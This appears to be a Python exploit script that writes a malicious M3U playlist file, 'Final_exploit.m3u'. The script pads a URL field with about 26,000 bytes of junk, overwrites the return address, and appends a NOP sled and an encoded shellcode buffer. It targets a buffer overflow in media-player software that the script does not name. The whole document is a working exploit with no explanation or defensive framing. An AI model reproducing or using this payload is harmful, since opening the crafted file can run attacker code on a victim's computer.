header="#EXTM3U\r\n"
line1="EXTINF:123,Sample artist - Sample title\r\n"


url_part1="http://"

junk1 = "A" * 26105
eip = "\x33\xf1\x4b\x78"
nops = "\x90" * 16

buf =  ""
buf += "\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xfe\x8c\x32\x11\x83\xee\xfc\xe2\xf4\x02\x64"
buf += "\xb0\x11\xfe\x8c\x52\x98\x1b\xbd\xf2\x75\x75\xdc\x02"
buf += "\x9a\xac\x80\xb9\x43\xea\x07\x40\x39\xf1\x3b\x78\x37"
buf += "\xcf\x73\x9e\x2d\x9f\xf0\x30\x3d\xde\x4d\xfd\x1c\xff"
buf += "\x4b\xd0\xe3\xac\xdb\xb9\x43\xee\x07\x78\x2d\x75\xc0"
buf += "\x23\x69\x1d\xc4\x33\xc0\xaf\x07\x6b\x31\xff\x5f\xb9"
buf += "\x58\xe6\x6f\x08\x58\x75\xb8\xb9\x10\x28\xbd\xcd\xbd"
buf += "\x3f\x43\x3f\x10\x39\xb4\xd2\x64\x08\x8f\x4f\xe9\xc5"
buf += "\xf1\x16\x64\x1a\xd4\xb9\x49\xda\x8d\xe1\x77\x75\x80"
buf += "\x79\x9a\xa6\x90\x33\xc2\x75\x88\xb9\x10\x2e\x05\x76"
buf += "\x35\xda\xd7\x69\x70\xa7\xd6\x63\xee\x1e\xd3\x6d\x4b"
buf += "\x75\x9e\xd9\x9c\xa3\xe4\x01\x23\xfe\x8c\x5a\x66\x8d"
buf += "\xbe\x6d\x45\x96\xc0\x45\x37\xf9\x73\xe7\xa9\x6e\x8d"
buf += "\x32\x11\xd7\x48\x66\x41\x96\xa5\xb2\x7a\xfe\x73\xe7"
buf += "\x7b\xf6\xd5\x62\xf3\x03\xcc\x62\x51\xae\xe4\xd8\x1e"
buf += "\x21\x6c\xcd\xc4\x69\xe4\x30\x11\xef\xd0\xbb\xf7\x94"
buf += "\x9c\x64\x46\x96\x4e\xe9\x26\x99\x73\xe7\x46\x96\x3b"
buf += "\xdb\x29\x01\x73\xe7\x46\x96\xf8\xde\x2a\x1f\x73\xe7"
buf += "\x46\x69\xe4\x47\x7f\xb3\xed\xcd\xc4\x96\xef\x5f\x75"
buf += "\xfe\x05\xd1\x46\xa9\xdb\x03\xe7\x94\x9e\x6b\x47\x1c"
buf += "\x71\x54\xd6\xba\xa8\x0e\x10\xff\x01\x76\x35\xee\x4a"
buf += "\x32\x55\xaa\xdc\x64\x47\xa8\xca\x64\x5f\xa8\xda\x61"
buf += "\x47\x96\xf5\xfe\x2e\x78\x73\xe7\x98\x1e\xc2\x64\x57"
buf += "\x01\xbc\x5a\x19\x79\x91\x52\xee\x2b\x37\xc2\xa4\x5c"
buf += "\xda\x5a\xb7\x6b\x31\xaf\xee\x2b\xb0\x34\x6d\xf4\x0c"
buf += "\xc9\xf1\x8b\x89\x89\x56\xed\xfe\x5d\x7b\xfe\xdf\xcd"
buf += "\xc4"



junk2 = "C" * 1000
url_part2=".example.com/test.m3u"

payload = junk1 + eip + nops + buf + junk2 

build = header + line1 +  url_part1 + payload + url_part2


fuzz_file = open("Final_exploit.m3u","w")
fuzz_file.write(build)
fuzz_file.close()